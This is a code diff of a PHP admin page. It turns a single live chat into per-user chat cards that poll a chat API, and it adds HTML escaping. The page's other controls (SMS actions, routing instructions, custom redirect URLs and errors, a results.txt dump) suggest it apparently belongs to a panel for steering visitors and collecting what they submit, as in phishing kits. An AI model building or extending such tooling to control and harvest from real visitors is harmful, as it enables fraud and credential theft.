@@ -152,18 +152,9 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
             </div>
             <div class="card" style="margin-top:12px">
                 <h3>Live Chat</h3>
-                <div class="row"><label><input type="checkbox" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for this user</label></div>
-                <div class="chat-box" id="chat-box">
-                    <?php if (empty($chatLog)): ?><div class="meta">No messages yet.</div><?php endif; ?>
-                    <?php foreach ($chatLog as $entry): ?>
-                        <div class="chat-message <?php echo htmlspecialchars($entry['sender']); ?>">
-                            <?php echo nl2br(htmlspecialchars($entry['message'])); ?>
-                            <div class="meta"><?php echo htmlspecialchars($entry['sender']); ?> • <?php echo date('Y-m-d H:i:s', $entry['timestamp']); ?></div>
-                        </div>
-                    <?php endforeach; ?>
-                </div>
-                <div class="row" style="margin-top:8px"><textarea id="admin-chat-message" class="chat-input-wide" placeholder="Write your message"></textarea></div>
-                <button type="button" id="send-admin-message">Send</button>
+                <div class="row"><label><input type="checkbox" name="chat_enabled" value="1" form="sms-form" <?php echo !empty($currentState['chat_enabled'])?'checked':''; ?>> Enable chat for selected user</label></div>
+                <div class="meta" style="margin-bottom:10px">Chats are isolated per user ID. You can reply to multiple users below without switching pages.</div>
+                <div id="multi-chat-container"></div>
             </div>
             <div class="card" style="margin-top:12px"><h3>results.txt</h3><pre style="white-space:pre-wrap"><?php echo htmlspecialchars($resultsContent); ?></pre></div>
         </div>
@@ -172,11 +163,10 @@ $resultsContent = file_exists($resultsFile) ? file_get_contents($resultsFile) : 
 <?php endif; ?>
 <script>
 const selectedUserId = <?php echo json_encode($selectedUserId); ?>;
+const allUsers = <?php echo json_encode(array_values($users), JSON_UNESCAPED_SLASHES); ?>;
 const smsForm = document.getElementById('sms-form');
 const flashMessage = document.getElementById('flash-message');
-const chatBox = document.getElementById('chat-box');
-const chatInput = document.getElementById('admin-chat-message');
-const sendButton = document.getElementById('send-admin-message');
+const multiChatContainer = document.getElementById('multi-chat-container');
 const controlRoute = document.getElementById('control_route');
 const smsActionsRow = document.getElementById('sms-actions-row');
 const smsAction = document.getElementById('sms_action');
@@ -185,6 +175,10 @@ const instructionField = document.getElementById('instruction');
 const customUrlRow = document.getElementById('custom-url-row');
 const customErrorRow = document.getElementById('custom-error-row');
 const customUrlField = document.getElementById('custom_url');
+
+function escapeHtml(value){
+    return String(value || '').replace(/[&<>"']/g, (ch) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[ch]));
+}
 
 function syncControlState(){
     if(!controlRoute||!smsModeField||!instructionField){return;}
@@ -228,12 +222,123 @@ function syncControlState(){
     }
 }
 
-function renderChat(messages){if(!chatBox)return;chatBox.innerHTML='';if(!messages.length){chatBox.innerHTML='<div class="meta">No messages yet.</div>';return;}messages.forEach((entry)=>{const div=document.createElement('div');div.className='chat-message '+entry.sender;div.innerHTML=`${entry.message.replace(/\n/g,'<br>')}<div class="meta">${entry.sender} • ${entry.formatted}</div>`;chatBox.appendChild(div);});chatBox.scrollTop=chatBox.scrollHeight;}
-async function fetchChat(){if(!selectedUserId)return;const res=await fetch('chat_api.php?action=fetch&user_id='+encodeURIComponent(selectedUserId));const data=await res.json();renderChat(data.messages||[]);} 
-async function sendChat(){if(!selectedUserId||!chatInput||!chatInput.value.trim())return;const message=chatInput.value.trim();chatInput.value='';await fetch('chat_api.php?action=send',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({sender:'admin',message,user_id:selectedUserId})});fetchChat();}
-if(sendButton){sendButton.addEventListener('click',sendChat);} if(chatInput){chatInput.addEventListener('keydown',(e)=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendChat();}});} if(selectedUserId){setInterval(fetchChat,1000);}
+function chatCardId(userId){
+    return 'chat-card-' + userId;
+}
+
+function renderChatCard(user){
+    if (!multiChatContainer || !user || !user.id) return;
+    const id = chatCardId(user.id);
+    let card = document.getElementById(id);
+    if (!card) {
+        card = document.createElement('div');
+        card.id = id;
+        card.className = 'card';
+        card.style.marginBottom = '10px';
+        card.innerHTML = `
+            <h4 style="margin:0 0 8px 0">${escapeHtml(user.name || 'Unknown')} <span class="meta">(${escapeHtml(user.id)})</span></h4>
+            <div class="chat-box" data-role="chat-box"><div class="meta">Loading...</div></div>
+            <div class="meta" data-role="chat-status" style="margin-top:8px"></div>
+            <div class="row" style="margin-top:8px"><textarea class="chat-input-wide" data-role="chat-input" placeholder="Write your message"></textarea></div>
+            <button type="button" data-role="chat-send">Send</button>
+        `;
+        multiChatContainer.appendChild(card);
+
+        const sendButton = card.querySelector('[data-role="chat-send"]');
+        const input = card.querySelector('[data-role="chat-input"]');
+        sendButton.addEventListener('click', () => sendChat(user.id));
+        input.addEventListener('keydown', (event) => {
+            if (event.key === 'Enter' && !event.shiftKey) {
+                event.preventDefault();
+                sendChat(user.id);
+            }
+        });
+    }
+}
+
+function renderMessages(userId, messages){
+    const card = document.getElementById(chatCardId(userId));
+    if (!card) return;
+    const box = card.querySelector('[data-role="chat-box"]');
+    if (!box) return;
+    if (!messages.length) {
+        box.innerHTML = '<div class="meta">No messages yet.</div>';
+        return;
+    }
+
+    box.innerHTML = messages.map((entry) => `
+        <div class="chat-message ${entry.sender === 'admin' ? 'admin' : 'user'}">
+            ${escapeHtml(entry.message).replace(/\n/g, '<br>')}
+            <div class="meta">${escapeHtml(entry.sender)} • ${escapeHtml(entry.formatted || '')}</div>
+        </div>
+    `).join('');
+    box.scrollTop = box.scrollHeight;
+}
+
+function setChatEnabled(userId, enabled){
+    const card = document.getElementById(chatCardId(userId));
+    if (!card) return;
+    const status = card.querySelector('[data-role="chat-status"]');
+    const input = card.querySelector('[data-role="chat-input"]');
+    const send = card.querySelector('[data-role="chat-send"]');
+    if (input) input.disabled = !enabled;
+    if (send) send.disabled = !enabled;
+    if (status) {
+        status.textContent = enabled ? 'Chat is enabled for this user.' : 'Chat disabled. Enable chat from control form to send new messages.';
+    }
+}
+
+async function fetchChatForUser(userId){
+    try {
+        const response = await fetch('chat_api.php?action=fetch&user_id=' + encodeURIComponent(userId));
+        const data = await response.json();
+        renderMessages(userId, data.messages || []);
+        setChatEnabled(userId, !!data.chat_enabled);
+    } catch (error) {
+        console.error('Unable to fetch chat for user', userId, error);
+    }
+}
+
+async function fetchAllChats(){
+    for (const user of allUsers) {
+        fetchChatForUser(user.id);
+    }
+}
+
+async function sendChat(userId){
+    const card = document.getElementById(chatCardId(userId));
+    if (!card) return;
+    const input = card.querySelector('[data-role="chat-input"]');
+    if (!input || !input.value.trim()) return;
+    const message = input.value.trim();
+    input.value = '';
+
+    try {
+        await fetch('chat_api.php?action=send', {
+            method:'POST',
+            headers:{'Content-Type':'application/x-www-form-urlencoded'},
+            body:new URLSearchParams({sender:'admin',message,user_id:userId})
+        });
+        fetchChatForUser(userId);
+    } catch (error) {
+        console.error('Unable to send message for user', userId, error);
+    }
+}
+
+if (multiChatContainer) {
+    allUsers.forEach((user) => renderChatCard(user));
+    if (selectedUserId) {
+        const selectedCard = document.getElementById(chatCardId(selectedUserId));
+        if (selectedCard) {
+            selectedCard.style.border = '1px solid #5b74ad';
+        }
+    }
+    fetchAllChats();
+    setInterval(fetchAllChats, 1000);
+}
+
 if(controlRoute){controlRoute.addEventListener('change',syncControlState);} if(smsAction){smsAction.addEventListener('change',syncControlState);} syncControlState();
-if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';});}
+if(smsForm){smsForm.addEventListener('submit',async(e)=>{e.preventDefault();syncControlState();const formData=new FormData(smsForm);formData.append('ajax','update_sms');const res=await fetch('admin.php',{method:'POST',body:formData});const data=await res.json();flashMessage.style.display='block';flashMessage.classList.toggle('error',!data.success);flashMessage.textContent=data.message||'Update failed.';if (selectedUserId) {fetchChatForUser(selectedUserId);} });}
 </script>
 </body>
 </html>
